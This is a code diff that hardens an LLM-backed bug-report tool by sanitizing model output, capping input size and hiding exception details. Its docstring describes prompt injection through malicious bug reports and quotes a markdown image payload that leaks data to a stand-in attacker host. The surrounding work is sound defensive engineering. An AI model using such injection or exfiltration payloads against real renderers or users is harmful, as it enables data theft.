@@ -15,6 +15,7 @@ from __future__ import annotations
 
 import json
 import logging
+import unicodedata
 from dataclasses import asdict, dataclass
 from typing import Any, Callable
 
@@ -60,7 +61,7 @@ def _error(message: str, **extra: Any) -> str:
     """Structured error string. Handlers must return a string, never raise."""
     payload: dict[str, Any] = {"error": message}
     payload.update(extra)
-    return json.dumps(payload, ensure_ascii=False)
+    return json.dumps(payload, ensure_ascii=True)
 
 
 # --- Input validation ----------------------------------------------------------
@@ -81,6 +82,9 @@ def _validate_input(args: Any) -> tuple[str, str, str]:
         context = ""
     if not isinstance(context, str):
         raise ValueError("`context` must be a string.")
+    if len(context.encode("utf-8")) > schema.MAX_CONTEXT_BYTES:
+        kb = schema.MAX_CONTEXT_BYTES // 1024
+        raise ValueError(f"`context` exceeds the {kb} KB limit.")
 
     fmt = args.get("format")
     if fmt is None or fmt == "":  # absent, null, or empty -> default
@@ -133,38 +137,69 @@ def _coerce_report(data: Any) -> dict[str, Any]:
 
 
 # --- Rendering -----------------------------------------------------------------
+def _md(s: str) -> str:
+    """Make a model-produced string safe to embed in the rendered Markdown.
+
+    The report text is ultimately attacker-influenced (a malicious bug report can
+    steer the model, and verbatim error text is echoed back), and the Markdown is
+    shown to humans — in a terminal for ``/improve-bug``, or rendered as HTML
+    downstream. So before interpolating any field we:
+
+    1. collapse all whitespace to single spaces, so a stray newline cannot forge a
+       new block (a fake ``## Severity`` heading or list item);
+    2. drop Unicode control/format characters, removing the ESC byte (ANSI escape
+       injection in a terminal) and bidi overrides (text-spoofing);
+    3. HTML-escape ``& < >``, so the text cannot smuggle live HTML / ``<script>``
+       through a renderer that passes raw HTML.
+
+    This does NOT neutralize Markdown link/image syntax (``[x](javascript:…)``,
+    ``![](http://attacker/?leak)``); escaping those would mangle legitimate report
+    text, so downstream HTML renderers must still use a sanitizing renderer (no raw
+    HTML, restricted URL schemes) — see the README's Security section. The ``json``
+    output is exempt: it returns the exact text, structurally escaped by the JSON
+    encoder, and leaves display escaping to the consumer.
+    """
+    s = " ".join(s.split())
+    s = "".join(ch for ch in s if unicodedata.category(ch)[0] != "C")
+    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+
+
 def _render_markdown(r: dict[str, Any]) -> str:
+    summary = _md(r["summary"])
+    expected = _md(r["expected_behavior"])
+    actual = _md(r["actual_behavior"])
+    rationale = _md(r["severity_rationale"])
     lines: list[str] = [
-        f"# {r['title']}",
+        f"# {_md(r['title'])}",
         "",
-        r["summary"] or "_Not provided._",
+        summary or "_Not provided._",
         "",
         "## Reproduction Steps",
         "",
     ]
     if r["reproduction_steps"]:
-        lines += [f"{i}. {step}" for i, step in enumerate(r["reproduction_steps"], 1)]
+        lines += [f"{i}. {_md(step)}" for i, step in enumerate(r["reproduction_steps"], 1)]
     else:
         lines.append("_None provided._")
     lines += [
         "",
         "## Expected Behavior",
         "",
-        r["expected_behavior"] or "_Not provided._",
+        expected or "_Not provided._",
         "",
         "## Actual Behavior",
         "",
-        r["actual_behavior"] or "_Not provided._",
+        actual or "_Not provided._",
         "",
-        f"## Severity: {r['severity']}",
+        f"## Severity: {_md(r['severity'])}",
         "",
-        r["severity_rationale"] or "_Not provided._",
+        rationale or "_Not provided._",
         "",
         "## Missing Evidence",
         "",
     ]
     if r["missing_evidence"]:
-        lines += [f"- {item}" for item in r["missing_evidence"]]
+        lines += [f"- {_md(item)}" for item in r["missing_evidence"]]
     else:
         lines.append("_None — the report appears complete._")
     return "\n".join(lines)
@@ -172,7 +207,9 @@ def _render_markdown(r: dict[str, Any]) -> str:
 
 def _format_output(report: dict[str, Any], fmt: str) -> str:
     if fmt == "json":
-        return json.dumps(report, ensure_ascii=False, indent=2)
+        # ensure_ascii=True escapes U+2028/U+2029: valid in JSON but they break
+        # JavaScript string literals if this JSON is later embedded in a page.
+        return json.dumps(report, ensure_ascii=True, indent=2)
     return _render_markdown(report)
 
 
@@ -255,9 +292,11 @@ def make_handler(ctx: Any) -> Callable[..., str]:
             return _error(f"LLM is unavailable: {exc}")
         except ValueError as exc:
             return _error(f"could not build a structured report: {exc}")
-        except Exception as exc:  # noqa: BLE001 - tool handlers must never raise
-            logger.warning("improve_bug_report failed: %s", exc)
-            return _error(f"unexpected error while improving the report: {exc}")
+        except Exception:  # noqa: BLE001 - tool handlers must never raise
+            # Log the detail (with traceback) but return a generic message: the
+            # exception text may carry host/library internals we should not leak.
+            logger.warning("improve_bug_report failed", exc_info=True)
+            return _error("internal error while improving the report")
 
         return _format_output(report, fmt)
 
